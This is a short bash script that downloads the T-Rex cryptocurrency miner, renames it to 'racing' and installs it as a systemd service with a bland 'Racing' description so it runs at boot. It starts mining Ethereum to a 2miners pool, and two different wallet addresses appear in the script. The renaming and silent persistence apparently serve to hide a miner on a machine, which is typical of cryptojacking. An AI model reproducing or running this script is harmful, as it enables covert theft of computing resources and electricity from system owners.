cd /home
sudo apt-get update
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xC46a50Bf45261e21B7418EeAf80e51f331a7Afb8 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x3cf2e52746bf8a1e8f9248b24bfc8b49b09c79b8 -p x -w madaothanhcong &
